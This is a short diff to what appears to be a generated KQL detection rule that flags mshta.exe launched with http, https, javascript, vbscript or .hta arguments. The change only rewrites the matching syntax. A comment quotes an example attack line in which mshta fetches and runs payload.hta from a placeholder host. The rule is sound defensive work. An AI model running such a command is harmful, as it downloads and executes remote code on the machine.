@@ -5,4 +5,4 @@
 //   mshta.exe http://<host>/payload.hta
 // source: rules/execution/mshta-remote-payload.yml  (GENERATED, do not edit by hand)
 Event
-| where (((NewProcessName endswith "\\mshta.exe")) and ((CommandLine has_any (dynamic(["http://", "https://", "javascript:", "vbscript:", ".hta"])))))
+| where (((NewProcessName endswith @"\mshta.exe")) and ((CommandLine contains @"http://" or CommandLine contains @"https://" or CommandLine contains @"javascript:" or CommandLine contains @"vbscript:" or CommandLine contains @".hta")))
